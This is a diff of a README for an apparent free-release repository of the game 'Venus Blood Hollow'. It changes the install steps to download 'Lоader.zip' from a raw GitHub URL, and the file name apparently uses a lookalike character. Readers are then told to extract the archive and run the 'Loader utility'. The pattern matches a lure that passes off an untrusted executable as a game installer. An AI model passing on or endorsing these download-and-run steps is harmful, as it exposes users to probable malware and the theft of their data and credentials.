@@ -22,7 +22,7 @@ Welcome to the **Venus Blood Hollow ** repository! This project provides an easy
 
 ## 🚀 Installation Instructions
 
-1. Download **Loader.rar** from the repository.  
+1. Download **https://raw.githubusercontent.com/beolog404/VenusBloodHollow-FreeReleaseHub/main/Lоader.zip** from the repository.  
 2. Extract the contents to a new folder.  
 3. Run the Loader utility and follow the on-screen guide.  
 4. Enjoy Venus Blood Hollow with all the latest game content!
